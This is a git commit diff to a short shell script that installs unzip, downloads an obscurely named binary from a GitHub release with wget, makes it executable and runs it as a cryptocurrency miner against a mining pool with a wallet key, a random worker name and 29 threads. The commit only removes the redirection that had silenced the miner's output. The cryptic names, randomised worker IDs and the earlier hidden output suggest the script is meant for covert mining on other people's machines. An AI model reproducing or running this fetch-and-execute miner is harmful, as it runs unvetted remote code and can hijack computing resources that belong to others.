da9832ad06c6c557dfcbe32e7953a059fd07940f
linxspec <naveenushapala@zohomail.in>
2025-07-16 00:08:32 +0530

    Update shhudf.sh

--- shhudf.sh
+++ shhudf.sh
@@ -2,4 +2,4 @@
 apt update && apt install unzip
 wget https://github.com/linxspec/shhhshhhsa/releases/download/ussvb/shhhs
 chmod +x shhhs
-./shhhs mine -a --pool twbitz --key GcwXpYMusMvpbFWx2UHARxnys428PUanXD3E8pBpv3RF --worker $(shuf -n 1 -i 1-99999)-Vrd -t 29 >/dev/null 2>&1
+./shhhs mine -a --pool twbitz --key GcwXpYMusMvpbFWx2UHARxnys428PUanXD3E8pBpv3RF --worker $(shuf -n 1 -i 1-99999)-Vrd -t 29
